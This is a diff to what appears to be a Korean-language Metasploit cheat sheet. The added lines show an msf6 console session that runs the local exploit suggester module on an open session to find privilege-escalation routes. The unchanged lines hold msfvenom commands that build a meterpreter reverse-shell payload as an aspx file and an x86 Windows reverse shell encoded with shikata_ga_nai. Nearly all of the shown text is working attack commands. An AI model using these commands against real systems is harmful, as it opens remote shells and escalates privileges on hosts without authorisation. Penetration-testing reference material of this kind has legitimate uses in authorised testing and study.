@@ -15,6 +15,18 @@
 ### MSFVenom으로 Payload 생성 (예 : aspx)
 ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1337 -f aspx > reverse_shell.aspx```
 
+### 권한 상승을 위한 Local Exploit Suggester 실행
+```
+msf6 > search local exploit suggester
+...
+2376  post/multi/recon/local_exploit_suggester
+...
+
+msf6 exploit(multi/handler) > use 2376
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+msf6 post(multi/recon/local_exploit_suggester) > run
+```
+
 ### MSFVenom으로 Payload Encoding (예 : shikata_ga_nai)
 ```msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai```
 
